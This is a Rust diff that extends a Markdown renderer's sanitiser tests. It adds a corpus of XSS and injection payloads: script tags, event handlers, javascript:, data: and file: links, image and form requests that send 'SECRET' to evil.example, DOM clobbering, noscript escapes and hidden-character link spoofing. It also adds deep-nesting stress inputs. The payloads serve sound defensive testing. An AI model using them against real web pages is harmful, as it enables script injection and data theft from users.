@@ -53,15 +53,274 @@ fn case(id: &str, class: &'static str, expect: Expect, marker: &str, source: &st
     Case { id: id.into(), class, expect, marker: marker.into(), source: source.into(), visible: String::new() }
 }
 
-/// The corpus. A hidden character in a later case is written as a braced escape and is never typed.
+impl Case {
+    /// The text the page must show for a `Text` case.
+    fn shown(mut self, visible: &str) -> Self {
+        self.visible = visible.into();
+        self
+    }
+}
+
+/// The corpus: ten classes. A hidden character is a braced escape in the literal and is never typed. Every marker is a piece
+/// of the parser's raw HTML; a case whose marker is not there proves nothing and fails the first test.
 fn corpus() -> Vec<Case> {
-    vec![case(
+    use Expect::{Open, Removed, Text};
+    let mut all = Vec::new();
+
+    // script: an element that runs.
+    all.push(case(
         "script-block",
         "script",
-        Expect::Removed,
+        Removed,
         "<script",
         "A paragraph before.\n\n<script>window.__XSS = 1</script>\n\n<img src=x onerror=\"window.__XSS = 1\">\n",
-    )]
+    ));
+    all.push(case("script-inline", "script", Removed, "<script", "Text with <script>window.__XSS = 1</script> inline.\n"));
+    all.push(case(
+        "script-split",
+        "script",
+        Removed,
+        "<script",
+        "<span>before <script>window.__XSS = 1</script><b>after</b></span> and more text\n",
+    ));
+    all.push(case(
+        "script-fence-info",
+        "script",
+        Open,
+        "language-",
+        "```<script>window.__XSS = 1</script>\nplain code\n```\n",
+    ));
+    all.push(case(
+        "script-link-text",
+        "script",
+        Removed,
+        "<script",
+        "[<script>window.__XSS = 1</script>](https://example.org/)\n",
+    ));
+    all.push(case(
+        "script-table-cell",
+        "script",
+        Removed,
+        "<script",
+        "| a | b |\n|---|---|\n| <script>window.__XSS = 1</script> | ok |\n",
+    ));
+
+    // handler: an attribute that runs.
+    for (id, marker, source) in [
+        ("img-onerror", "onerror", "Look: <img src=x onerror=\"window.__XSS = 1\"> here\n"),
+        ("svg-onload", "onload", "Look: <svg onload=\"window.__XSS = 1\"></svg> here\n"),
+        ("body-onload", "onload", "<body onload=\"window.__XSS = 1\">text</body>\n"),
+        (
+            "details-ontoggle",
+            "ontoggle",
+            "<details open ontoggle=\"window.__XSS = 1\"><summary>sum</summary>body</details>\n",
+        ),
+        ("input-onfocus", "onfocus", "<input autofocus onfocus=\"window.__XSS = 1\">\n"),
+        ("anchor-onclick", "onclick", "<a href=\"https://example.org/\" onclick=\"window.__XSS = 1\">x</a>\n"),
+        (
+            "div-onmouseover",
+            "onmouseover",
+            "<div onmouseover=\"window.__XSS = 1\" style=\"position:fixed;inset:0\">cover</div>\n",
+        ),
+    ] {
+        all.push(case(id, "handler", Removed, marker, source));
+    }
+
+    // scheme: an address that runs or loads. The marker names the attribute so that the text of an autolink does not count.
+    for (id, marker, source) in [
+        ("js-plain", "href=\"javascript:", "[click](javascript:window.__XSS=1)\n"),
+        ("js-mixed-case", "href=\"JaVaScRiPt:", "[click](JaVaScRiPt:window.__XSS=1)\n"),
+        ("js-tab-inside", "java&#9;script:", "<a href=\"java&#9;script:window.__XSS=1\">click</a>\n"),
+        ("js-entity", "href=\"javascript:", "[click](javascript&#58;window.__XSS=1)\n"),
+        ("js-leading-control", "&#1;javascript:", "<a href=\"&#1;javascript:window.__XSS=1\">click</a>\n"),
+        ("js-autolink", "href=\"javascript:", "<javascript:window.__XSS=1>\n"),
+        ("js-reference", "href=\"javascript:", "[click][r]\n\n[r]: javascript:window.__XSS=1\n"),
+        ("data-html", "href=\"data:text", "[click](data:text/html;base64,PHNjcmlwdD53aW5kb3cuX19YU1M9MTwvc2NyaXB0Pg==)\n"),
+        ("vbscript", "href=\"vbscript:", "[click](vbscript:msgbox(1))\n"),
+        ("file-url", "href=\"file:///", "[click](file:///etc/passwd)\n"),
+        ("holzfile-token", "href=\"holzfile:", "[click](holzfile:abc123)\n"),
+    ] {
+        all.push(case(id, "scheme", Removed, marker, source));
+    }
+    for (id, marker, source) in [
+        ("protocol-relative", "//evil.example", "[click](//evil.example/x)\n"),
+        ("relative-path", "../notes.md", "[notes](../notes.md)\n"),
+        ("fragment", "#top", "[top](#top)\n"),
+    ] {
+        all.push(case(id, "scheme", Open, marker, source));
+    }
+
+    // image: everything that loads a resource.
+    for (id, marker, source) in [
+        ("remote-image-query", "<img", "![x](https://evil.example/a.png?d=SECRET)\n"),
+        ("image-reference", "<img", "![x][r]\n\n[r]: https://evil.example/b.png?d=SECRET\n"),
+        ("raw-img-remote", "<img", "<img src=\"https://evil.example/c.png?d=SECRET\">\n"),
+        (
+            "picture-source",
+            "<picture",
+            "<picture><source srcset=\"https://evil.example/d.png\"><img src=\"https://evil.example/e.png\"></picture>\n",
+        ),
+        (
+            "video-poster",
+            "<video",
+            "<video poster=\"https://evil.example/p.png\" src=\"https://evil.example/v.mp4\"></video>\n",
+        ),
+        ("svg-image", "<svg", "<svg><image href=\"https://evil.example/i.png\"/></svg>\n"),
+        ("input-image", "type=\"image\"", "<input type=\"image\" src=\"https://evil.example/f.png\">\n"),
+        (
+            "css-url-style",
+            "style=",
+            "<p style=\"background:url(https://evil.example/bg.png)\">styled</p>\n",
+        ),
+        ("link-stylesheet", "<link", "<link rel=\"stylesheet\" href=\"https://evil.example/s.css\">\n"),
+        (
+            "meta-refresh",
+            "<meta",
+            "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/\">\n",
+        ),
+        ("base-href", "<base", "<base href=\"https://evil.example/\">\n"),
+    ] {
+        all.push(case(id, "image", Removed, marker, source));
+    }
+
+    // markup: elements that frame, embed, submit or hide.
+    for (id, marker, source) in [
+        ("iframe", "<iframe", "<iframe src=\"https://evil.example/f\"></iframe>\n"),
+        (
+            "object-embed",
+            "<object",
+            "<object data=\"https://evil.example/o\"></object><embed src=\"https://evil.example/e\">\n",
+        ),
+        (
+            "form-formaction",
+            "<form",
+            "<form action=\"https://evil.example/post\"><button formaction=\"https://evil.example/x\">go</button></form>\n",
+        ),
+        (
+            "math-maction",
+            "<math",
+            "<math><maction actiontype=\"statusline#\" xlink:href=\"javascript:window.__XSS=1\">x</maction></math>\n",
+        ),
+        ("template", "<template", "<template><img src=x onerror=\"window.__XSS = 1\"></template>\n"),
+        (
+            "noscript",
+            "<noscript",
+            "<noscript><p title=\"</noscript><img src=x onerror=window.__XSS=1>\">x</p></noscript>\n",
+        ),
+        ("style-import", "<style", "<style>@import url(https://evil.example/s.css); p { display: none }</style>\n"),
+        ("textarea-xmp", "<textarea", "<textarea></textarea><xmp><img src=x onerror=window.__XSS=1></xmp>\n"),
+    ] {
+        all.push(case(id, "markup", Removed, marker, source));
+    }
+
+    // clobber: attributes that take a global name.
+    for (id, marker, source) in [
+        ("anchor-id", "id=\"x\"", "<a id=\"x\" href=\"https://example.org/\">x</a>\n"),
+        ("form-name", "name=\"", "<form name=\"documentElement\"><img name=\"body\"></form>\n"),
+        ("img-name", "name=\"", "<img name=\"querySelector\" src=x>\n"),
+        ("id-proto", "id=\"__proto__\"", "<p id=\"__proto__\">x</p>\n"),
+    ] {
+        all.push(case(id, "clobber", Removed, marker, source));
+    }
+
+    // nest: depth and width the renderer has to carry.
+    let quotes = format!("{}x\n", "> ".repeat(30));
+    all.push(case("nested-quotes-30", "nest", Open, "<blockquote>", &quotes));
+    let lists: String = (0..30).map(|i| format!("{}- item {i}\n", "  ".repeat(i))).collect();
+    all.push(case("nested-lists-30", "nest", Open, "<ul>", &lists));
+    let tables = format!("{}x{}\n", "<table><tr><td>".repeat(20), "</td></tr></table>".repeat(20));
+    all.push(case("nested-tables-20", "nest", Open, "<table>", &tables));
+    let emphasis = format!("{}word{}\n", "*".repeat(200), "*".repeat(200));
+    all.push(case("emphasis-run", "nest", Open, "word", &emphasis));
+    let brackets = format!("{}x\n", "[".repeat(500));
+    all.push(case("brackets-run", "nest", Open, "[[[[", &brackets));
+
+    // table: wide and awkward tables.
+    let header: String = (0..64).map(|i| format!("| h{i} ")).collect::<String>() + "|\n";
+    let rule: String = "|---".repeat(64) + "|\n";
+    let row = |n: usize| (0..64).map(|i| format!("| r{n}c{i} ")).collect::<String>() + "|\n";
+    all.push(case("wide-table-64", "table", Open, "<table>", &format!("{header}{rule}{}{}{}", row(1), row(2), row(3))));
+    all.push(case(
+        "table-pipes-in-code",
+        "table",
+        Open,
+        "<code>",
+        "| a | b |\n|---|---|\n| `x \\| y` | z |\n",
+    ));
+
+    // text: markup that must stay text, and hidden characters that must not change a link.
+    all.push(
+        case(
+            "entity-literal",
+            "text",
+            Text,
+            "&lt;script&gt;",
+            "&lt;script&gt;window.__XSS = 1&lt;/script&gt;\n",
+        )
+        .shown("<script>window.__XSS = 1</script>"),
+    );
+    all.push(
+        case(
+            "fence-html",
+            "text",
+            Text,
+            "&lt;script&gt;",
+            "```html\n<script>window.__XSS = 1</script>\n```\n",
+        )
+        .shown("<script>window.__XSS = 1</script>"),
+    );
+    all.push(
+        case(
+            "inline-code-html",
+            "text",
+            Text,
+            "&lt;img",
+            "Use `<img src=x onerror=window.__XSS=1>` as an example.\n",
+        )
+        .shown("<img src=x onerror=window.__XSS=1>"),
+    );
+    all.push(case(
+        "bidi-link-text",
+        "text",
+        Open,
+        "href=\"https://evil.example/x\"",
+        "[https://example.org/\u{202e}fdp.exe](https://evil.example/x)\n",
+    ));
+    all.push(case(
+        "tag-characters",
+        "text",
+        Open,
+        "world",
+        "Hello \u{e0041}\u{e0042}\u{e0043} world \u{200d} end\n",
+    ));
+    all.push(case(
+        "zero-width-split",
+        "text",
+        Open,
+        "href=\"java",
+        "[click](java\u{200b}script:window.__XSS=1)\n",
+    ));
+
+    // soup: markup that is not well formed.
+    all.push(case("unclosed-script-at-end", "soup", Removed, "<script", "text <script>window.__XSS = 1\n"));
+    all.push(
+        case(
+            "half-open-tag",
+            "soup",
+            Text,
+            "&lt;img src=x",
+            "before <img src=x onerror=window.__XSS=1 after\n",
+        )
+        .shown("<img src=x onerror=window.__XSS=1 after"),
+    );
+    all.push(case(
+        "broken-comment",
+        "soup",
+        Removed,
+        "<script",
+        "<!-- hidden\n\n<script>window.__XSS = 1</script>\n\nafter\n",
+    ));
+    all
 }
 
 /// What the sanitiser has to clean: the parser's own HTML for `source`, with the four options of the renderer.
@@ -194,6 +453,14 @@ fn problems(html: &str) -> Vec<String> {
             found.push(format!("forbidden element <{}>", tag.name));
         } else if !ALLOWED_ELEMENTS.contains(&tag.name.as_str()) {
             found.push(format!("element <{}> is not on the allow-list", tag.name));
+        }
+        // An input is a task list's box and nothing else: a disabled checkbox. Any other input is a field the person could fill.
+        if tag.name == "input" {
+            let checkbox = tag.attributes.iter().any(|(n, v)| n == "type" && v == "checkbox");
+            let disabled = tag.attributes.iter().any(|(n, _)| n == "disabled");
+            if !checkbox || !disabled {
+                found.push("input that is not a disabled checkbox".to_string());
+            }
         }
         for (name, value) in &tag.attributes {
             if FORBIDDEN_ATTRIBUTES.contains(&name.as_str()) {
@@ -336,6 +603,12 @@ fn the_corpus_is_live_every_case_has_its_marker_in_the_raw_html() {
     }
     let ids: std::collections::HashSet<&str> = cases.iter().map(|c| c.id.as_str()).collect();
     assert_eq!(ids.len(), cases.len(), "ids are unique");
+    assert!(cases.len() >= 60, "the corpus has {} cases, at least 60 are required", cases.len());
+    for class in ["script", "handler", "scheme", "image", "markup", "clobber", "nest", "table", "text", "soup"] {
+        let n = cases.iter().filter(|c| c.class == class).count();
+        assert!(n >= 2, "the class {class} has {n} cases, at least 2 are required");
+    }
+    assert!(cases.iter().all(|c| ["script", "handler", "scheme", "image", "markup", "clobber", "nest", "table", "text", "soup"].contains(&c.class)));
 }
 
 #[test]
@@ -347,6 +620,8 @@ fn the_renderer_output_has_no_forbidden_element_attribute_or_scheme() {
     }
     assert!(problems("<p><a href=\"data:text/html,x\">d</a></p>").iter().any(|l| l.contains("data")), "a data link is flagged");
     assert!(problems("<p><a href=\"ftp://example.org/\">d</a></p>").iter().any(|l| l.contains("ftp")), "any other scheme is flagged");
+    assert!(problems("<input>").iter().any(|l| l.contains("input")), "a plain input is flagged");
+    assert!(problems("<input type=\"checkbox\" checked=\"\" disabled=\"\">").is_empty(), "a task list's box passes");
     assert!(problems("<p><a href=\"../notes.md\">r</a> <a href=\"https://example.org/\">h</a> <a href=\"mailto:a@example.org\">m</a></p>").is_empty());
     assert!(ALLOWED_ELEMENTS.iter().all(|e| !FORBIDDEN_ELEMENTS.contains(e)), "an element is both allowed and forbidden");
     assert_eq!(tags_of("<a href=\"x\" rel=\"y\">t</a><br>").len(), 3);
@@ -355,6 +630,52 @@ fn the_renderer_output_has_no_forbidden_element_attribute_or_scheme() {
         let Some(out) = core_html(&c) else { continue };
         let found = problems(&out);
         assert!(found.is_empty(), "{}: {found:?}\n{out}", c.id);
+    }
+}
+
+/// A source that goes deep or wide, built at run time: its id and the text.
+fn stress_sources() -> Vec<(&'static str, String)> {
+    let cells = |n: usize, fill: &str| format!("|{}\n", format!(" {fill} |").repeat(n));
+    vec![
+        ("quotes-100", format!("{}x\n", "> ".repeat(100))),
+        ("quotes-1000", format!("{}x\n", "> ".repeat(1000))),
+        ("quotes-10000", format!("{}x\n", "> ".repeat(10000))),
+        ("lists-1000", (0..1000).map(|i| format!("{}- x\n", "  ".repeat(i))).collect()),
+        ("emphasis-100000", format!("{}word{}\n", "*".repeat(100_000), "*".repeat(100_000))),
+        ("brackets-100000", format!("{}x\n", "[".repeat(100_000))),
+        ("table-5000-cols", format!("{}{}", cells(5000, "h"), cells(5000, "---"))),
+        ("html-div-10000", format!("{}x\n", "<div>".repeat(10_000))),
+        ("html-table-1000", format!("{}x\n", "<table><tr><td>".repeat(1000))),
+        ("line-1900000", "a".repeat(1_900_000)),
+        ("over-limit", "a".repeat(MAX_MARKDOWN + 1)),
+    ]
+}
+
+#[test]
+fn deep_and_wide_documents_render_or_are_refused_without_crashing() {
+    // An async worker of the shell has a 2 MiB stack, and a stack overflow ends the whole app, not one request: each source
+    // runs on a thread of that size and must answer, or refuse, within 20 seconds.
+    for (id, source) in stress_sources() {
+        let length = source.len();
+        let (tx, rx) = std::sync::mpsc::channel();
+        let worker = std::thread::Builder::new()
+            .name(format!("render-{id}"))
+            .stack_size(2 * 1024 * 1024)
+            .spawn(move || {
+                let _ = tx.send(render_markdown(&source).map(|html| html.len()));
+            })
+            .expect("spawn");
+        let answer = rx
+            .recv_timeout(std::time::Duration::from_secs(20))
+            .unwrap_or_else(|e| panic!("{id}: the renderer did not answer within 20 seconds ({e}); a crash or a hang is a defect of the renderer"));
+        worker.join().unwrap_or_else(|_| panic!("{id}: the renderer panicked"));
+        if length > MAX_MARKDOWN {
+            assert!(answer.is_none(), "{id}: a source over the limit must be refused");
+        }
+        if let Some(out) = answer {
+            let most = (length * 64).max(1024);
+            assert!(out <= most, "{id}: the answer has {out} bytes for a source of {length}, the most is {most}");
+        }
     }
 }
 
